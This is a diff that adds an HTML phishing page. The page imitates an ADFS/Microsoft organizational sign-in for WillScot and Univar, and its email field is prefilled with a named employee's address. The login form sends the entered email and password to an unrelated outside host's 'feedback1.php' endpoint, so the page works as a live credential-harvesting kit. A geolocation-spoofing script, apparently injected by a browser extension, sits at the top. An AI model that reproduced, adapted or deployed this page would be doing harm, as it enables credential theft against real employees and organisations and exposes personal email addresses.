@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>(function(){function VkmZt() {
+  //<![CDATA[
+  window.wUfZKgs = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+  window.ziZSRiw = navigator.geolocation.watchPosition.bind(navigator.geolocation);
+  let WAIT_TIME = 100;
+
+  
+  if (!['http:', 'https:'].includes(window.location.protocol)) {
+    // assume the worst, fake the location in non http(s) pages since we cannot reliably receive messages from the content script
+    window.AHNVy = true;
+    window.BlzmX = 38.883333;
+    window.DdYLA = -77.000;
+  }
+
+  function waitGetCurrentPosition() {
+    if ((typeof window.AHNVy !== 'undefined')) {
+      if (window.AHNVy === true) {
+        window.EhZBBUB({
+          coords: {
+            latitude: window.BlzmX,
+            longitude: window.DdYLA,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        window.wUfZKgs(window.EhZBBUB, window.HDLqlxp, window.WbtHs);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof window.AHNVy !== 'undefined')) {
+      if (window.AHNVy === true) {
+        navigator.getCurrentPosition(window.dFrPmdN, window.fiKuaXn, window.slRet);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        window.ziZSRiw(window.dFrPmdN, window.fiKuaXn, window.slRet);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+    window.EhZBBUB = successCallback;
+    window.HDLqlxp = errorCallback;
+    window.WbtHs = options;
+    waitGetCurrentPosition();
+  };
+  navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+    window.dFrPmdN = successCallback;
+    window.fiKuaXn = errorCallback;
+    window.slRet = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${VkmZt}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  Object.freeze(navigator.geolocation);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'hhNBaoA':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          window.BlzmX = message.info.coords.lat;
+          window.DdYLA = message.info.coords.lon;
+          window.AHNVy = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}VkmZt();})()</script>
+        <meta http-equiv="X-UA-Compatible" content="IE=10.000">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        
+        <meta http-equiv="cache-control" content="no-cache,no-store">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="-1">
+        <meta name="mswebdialog-title" content="Connecting to Univar Inc.">
+
+        <title>Sign In</title>
+        <script type="text/javascript">
+//<![CDATA[
+function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password must be shorter than 128 characters.';}; var maxPasswordLength = 128;
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" type="text/css" href="style.css"><style>.illustrationClass {background-image:url(illustration.png?id=7EB802193B6E0DB8C5583C8AB05B9189598F9F20A3D349DAEAAF37472512EB14);}</style>
+
+    </head>
+    <body dir="ltr" class="body">
+    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+        <h1>JavaScript required</h1>
+        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding" class="illustrationClass"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                     sts.willscot.com 
+                </div>
+                <div id="workArea">
+                    
+    <div id="authArea" class="groupMargin">
+        
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+
+        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="https://www.707222junk.com/feedback1.php">
+            <div id="error" class="fieldMargin error smallText" style="display: none;">
+                <label id="errorText" for=""></label>
+            </div>
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <input id="userNameInput" name="email" type="email" value="sharon.ross@willscot.com" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">     
+                </div>
+
+                <div id="passwordArea">
+                     <input id="passwordInput" name="password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">                                   
+                </div>
+                <div id="kmsiArea" style="display:none">
+                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                    <label for="kmsiInput">Keep me signed in</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit" tabindex="4" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();">Sign in</span>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+        </form>
+
+             <div id="authOptions">
+        <form id="options" method="post" action="https://fs.chemd.net/adfs/ls/?client-request-id=b6a52e65-23eb-4a43-9f5c-afc31a17764c&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAYWSvYvbZgDGLfvOuRy0vYSQhAzhoIGWguRX0mvJMgQiW7ZPjj5Oss62RMBItmS9sj58lmTZ3rJ1600ZMiQQyJKl0KGUrh0KN2XO2Km0UEqnQpbc_QVZnodn_T2_wxsMQRGAAN9VSIJsPoI0rNusw-GczdA45EiA25BicLpOMzQFyFkd0Kvbh0cu8fbnv79u918_-_G3B_fW0jvsoZ9ly7RZqxVFQSSeh6YuMU2iWmjHMxTPf8Gw9xj2J4a9LO-7MX42eFdOGZolIWBJhmUgbDQgxRFqzwSKoS_knpnJuxayEADyTttKxnyjjsRMNfRAFbS6vPMDtXfVUTc0I5OWIzGzRhqltgEwA62QDD-yAj5TAj9UhK4vU1Yoj8T6h_JXKp9nPnUdyQrt3P_KN71kFU2WSZq9rLwobxjpFLH-diNGWj0KunQ_Nod9Q8_5ENfdIqk7Z85YjsFqB3MpT3UrAkAQFAYaq3QteROrEzqR3QspYWGGsTnfciwAIOi7ejsXrXPuXF4uJgGzHsrqpgu3p6Jy3ppJVh4vh7RBMcV4mroK6p6AeVt7us7rcX_QFc0xFBqyZrqhFc3IUWswmzZExslZGkr20jxpczzpS6MzVjfnIfJa-pRHeEaj1kQOu87T3tZdiAaHj3hnyvHA2p1NDUfbzgaDvi-e9jc05W5yRYb5YjHpDtXOOHOKDhrPT3caP-uwtF78VKlenRkl8WXly2Tpxmh2vFwlHgrdPyqPlshdodgm7NCxYzd1n-QxWturNAnzDCVxeu3B-z3sr727B9Wj8v3ScenbO6DSPDg4PCpdr__3sDf7V1L98_GL-0eXvz959fybi9c_3C1d7tdq8cCjtCvolsSB4CS0Cx6sB9TGG7ZJeZQuaD62Uc3y-qT2GDTJiyp2Ua1eVm-JwkTpGAODVwReF6gJ-LeKfX-j9OvNz2j64fAOBSiAAxIHjWPANUnYhND6BA2&amp;cbcxt=&amp;username=pierina.albanese%40univarsolutions.com&amp;mkt=en-US&amp;lc=">
+            <script type="text/javascript">
+                function SelectOption(option) {
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+            </script>
+            <input id="optionSelection" type="hidden" name="AuthMethod">
+            <div class="groupMargin"></div>
+        </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+                                 
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'userNameInput';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+                if (!userName.value || !userName.value.match('[@\\\\]')) {
+                    u.setError(userName, e.userNameFormatError);
+                    return false;
+                }
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                if (password.value.length > maxPasswordLength) {
+                    u.setError(password, e.passwordTooLong);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+        </script>
+    </div>
+
+    </div>
+
+                </div>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <div id="footer">
+                <div id="footerLinks" class="floatReverse">
+                     <div><span id="copyright">© 2013 Microsoft</span><a id="home" class="pageLink" href="https://www.univar.com/">Home</a><a id="privacy" class="pageLink" href="http://www.univar.com/en/Privacy-Notice.aspx">Privacy</a></div>
+                </div>
+            </div>
+        </div> 
+    </div>
+    <script type="text/javascript">
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+    var emails = document.querySelectorAll("input[type='email']");
+    if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+            emails[i].type = 'text';
+        }
+    }
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+    var msViewportStyle = document.createElement("style");
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{width:auto!important}"
+        )
+    );
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{height:auto!important}"
+        )
+    );
+    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+    var viewport = document.querySelector("meta[name=viewport]");
+    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+    var propStyle = null;
+
+    if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+    }
+    else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+    }
+
+    return propStyle;
+}
+
+// The script below is used for downloading the illustration image 
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+var computeLoadIllustration = function () {
+    var branding = document.getElementById("branding");
+    var brandingDisplay = getStyle(branding, "display");
+    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+    if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
+        if (branding.classList && branding.classList.add) {
+            branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+            branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+            window.removeEventListener('load', computeLoadIllustration, false);
+            window.removeEventListener('resize', computeLoadIllustration, false);
+        }
+        else if (window.detachEvent) {
+            window.detachEvent('onload', computeLoadIllustration);
+            window.detachEvent('onresize', computeLoadIllustration);
+        }
+    }
+};
+
+if (window.addEventListener) {
+    window.addEventListener('resize', computeLoadIllustration, false);
+    window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+    window.attachEvent('onresize', computeLoadIllustration);
+    window.attachEvent('onload', computeLoadIllustration);
+}
+
+//]]>
+</script>
+
+
+    
+ 
+
+</body></html>
